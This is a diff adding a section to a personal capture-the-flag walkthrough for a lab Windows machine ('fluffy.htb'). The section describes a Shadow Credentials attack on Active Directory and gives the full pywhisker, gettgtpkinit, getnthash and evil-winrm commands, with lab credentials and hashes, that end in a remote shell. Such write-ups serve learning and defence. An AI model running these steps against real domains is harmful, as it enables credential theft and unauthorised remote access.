@@ -272,15 +272,61 @@ And from the servuce account manager role, we can see that we can do alot becaus
 
 </details>
 
+Attack 
+=
 Next we start the atatck
 
 > give service manager role to agila and make fake cert
 ![image](https://github.com/user-attachments/assets/2c6d7619-ef2a-4ca1-baf7-9bf33a76a7bf)
 
-> oh, kerberos is very dependent on time, im calling dio 
->![image](https://github.com/user-attachments/assets/4addd188-9a23-4342-9fed-fd8a7be68cd8)
+> oh, kerberos is very dependent on time, im calling dio (this part didnt really work out) 
+> ![image](https://github.com/user-attachments/assets/4addd188-9a23-4342-9fed-fd8a7be68cd8)
 > ![image](https://github.com/user-attachments/assets/e2c85061-4c56-4765-8ec1-16b20d250ff5)
 
 
+> after spending way too much time (pun) changing the system time to match their system time, it was make known that GUI through system settings was the only way
+> ![image](https://github.com/user-attachments/assets/887affa9-8395-4e85-935a-061cc7fd3301)
 
+> as the repo stated, its magic really, it was
+> ![image](https://github.com/user-attachments/assets/e3db27de-6920-47f6-867f-8601bc42d3f9)
 
+> now time to get a shell and it will be smooth sailing from there 
+> ![image](https://github.com/user-attachments/assets/264a9d81-af80-4e84-806a-4bb1d1b78fea)
+
+> [!NOTE]
+> This is all for me to refer back incase i forget (which i am very forgetful)
+> mostly ai gen as i dont know much aabout windows ad **aS A lINux uSEr**
+
+The exploit here is using shadow crdential and exploit the ```msDS-KeyCredentialLink``` in AD. It allows users authenticate with a certificate instead of a password. 
+This attack requires at least a user access and GenericWrite or GenericAll over target user (in this case agila) or WriteProperty specifically on msDS-KeyCredentialLink. Thse usually comes from compromosed service account or misconfigured privilleges. 
+
+The attack starts with generating a new RSA key pair and certificate with pywisker. It also writes the cert and keypair to the target user's msDS-KeyCredentialLink
+```
+./pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
+```
+in the ad, this happens
+```
+# This is essentially what pywhisker does via LDAP
+Set-ADUser -Identity "winrm_svc" -Add @{'msDS-KeyCredentialLink'=$certificateData}
+# by claude
+```
+
+Next Up is the TGT REquest from gettgtpkinit (get tgt pk init?)
+A TGT (ticket granting ticket), a weird ass Microsoft term =) is an encrypted ticket issued by the Authentication Server (AS). It is used to access network rescources.
+
+By using the private key generated from pywhisker, it sends AS-REQ (Authentication Server Request) with PKINIT (Public Key Cryptography for Initial Authentication)
+On the server side, the domain controller validates the certificate against msDS-KeyCredentialLink and issues a TGT and  session key if valid 
+```
+python3 gettgtpkinit.py -cert-pem V0shaM75_cert.pem -key-pem V0shaM75_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
+```
+
+Now that we have an AES ket from the TGT Request from before to request the victim user (in this case winrm) NT hash through the U2U (User-to-User) authentication process.
+NT hash is the windows format of storing and hashing password which allows evil-winrm to usse it for authentication 
+```
+python3 getnthash.py -key "c8544f389cecfe58224d6728259683b5d845ca591cad93f892427e123a5e0850" fluffy.htb/winrm_svc
+```
+
+Then finally the attacker can get a shell by using evil-winrm and the NT hash from previous step. 
+```
+evil-winrm -i 10.10.11.69 -u winrm_svc -H "33bd09dcd697600edf6b3a7af4875767"
+```
